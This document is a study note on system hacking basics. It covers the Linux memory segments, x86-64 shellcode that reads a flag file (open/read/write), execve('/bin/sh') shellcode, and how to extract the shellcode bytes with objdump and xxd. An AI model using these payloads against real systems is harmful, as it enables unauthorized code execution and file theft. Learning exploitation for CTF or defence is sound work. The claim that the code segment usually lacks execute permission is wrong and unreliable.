# System hacking basic

Reminding system hacking basic things. 

## Linux Memory Layout
Linux: Divide process's memory into largely 5 segments -> (code, data, bss, heap, stack)

### Code
Segment for 'exeuctable' machine code. Also known as Text Segment. 
Doesn't have execute capability in most cases. 

### Data
Segment for global variables and constants whose values are already fixed during compile.
Usually have read capability. Data segment is again divided into two segments: writable, nonwritable

Writable: data segment
Non writable: rodata segment 

### Bss
Segment for global variables and constants whose values are not fixed yet during compile.
When program starts, this segment is initialized with zero.  
Usually have 'read', 'write'.

### Stack
Segment for temporary variables such as parameter for functions and local variables. 
Usually used in units called 'stack frames'. Grows toward 'low address'.

### Heap 
Segment for heap data. Dynamically allocated during runtime. 
Usually has 'read', 'write'. 

## Shell code
If attacker can controll rip, attacker can execute arbitrary assembly code. 

### ORW shell code

Bellow C code is pseudo code that shows what shell code does.

```
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

syscall rax arg0(rdi)         arg1(rsi) arg2(rdx)
read    0x0 unsigned int fd   char *buf size_t count
write   0x1 unsigned int fd   char *buf size_t count
open    0x2 char *filename    int flag  umode_t mode

#### 1. int fd = open("/tmp/flag", RD_ONLY, NULL)
First, string "/tmp/flag" should be on the memory. -> push
But, push operation works in units of 8 bytes. So, push 0x67, then push 0x616c662f706d742f.

"/tmp/flag" in little endian: 0x67616c662f706d742f

O_RDONLY = 0 -> set rsi 0
mode -> meaningless, set rdx 0
rax -> 0x2(open)

```
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

#### 2. read(fd, buf, 0x30)
File descriptor number obtained by 'open' goes to rax. So, 'mov rdi, rax'
```
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
```

#### 3. write(1, buf, 0x30)
standard output(stdout) -> set rdi 0x1
rsi, rdx stays same

```
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

How to compile into ELF
```
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }
```

### execve shell code

Only uses execve systemcall: execve("/bin/sh",null,null)

syscall rax   arg0(rdi)         arg1(rsi)    arg2(rdx)
execve  0x3b  char *filename    char *argv   char *const *envp

```
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

### How to extract shell code

How to extract shellcode in the form of byte code(opcode)

```
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
```

We can use xxd command 

```
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
```

